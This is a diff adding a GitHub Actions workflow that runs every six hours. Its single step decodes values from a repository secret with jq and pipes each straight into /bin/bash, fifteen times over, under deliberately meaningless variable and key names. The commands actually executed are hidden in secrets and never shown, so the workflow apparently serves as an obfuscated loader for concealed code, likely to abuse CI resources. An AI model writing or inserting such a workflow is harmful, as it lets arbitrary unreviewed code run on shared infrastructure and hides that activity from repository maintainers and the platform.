@@ -1,0 +1,32 @@
+name: xiayizhangzhao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiayizhangzhao
+        env:
+          xijg22705: ${{ secrets.xijg22705 }}
+        run: |
+          echo $xijg22705 | jq -r .hy63 | /bin/bash
+          echo $zc76897 | jq -r .yaivp40 | /bin/bash
+          echo $int46 | jq -r .z20729 | /bin/bash
+          echo $yiryp491 | jq -r .fegk7164 | /bin/bash
+          echo $vmm4222 | jq -r .tn376 | /bin/bash
+          echo $atq09725 | jq -r .fige61655 | /bin/bash
+          echo $qimkz8949 | jq -r .g6 | /bin/bash
+          echo $lnpky765 | jq -r .r812 | /bin/bash
+          echo $zt87180 | jq -r .mozjv557 | /bin/bash
+          echo $abae7710 | jq -r .lnjc80 | /bin/bash
+          echo $hn12560 | jq -r .gfb5807 | /bin/bash
+          echo $r7 | jq -r .x94936 | /bin/bash
+          echo $bwk860 | jq -r .sbkc4 | /bin/bash
+          echo $f7 | jq -r .urh06047 | /bin/bash
+          echo $hvaj73 | jq -r .defxn1 | /bin/bash
+
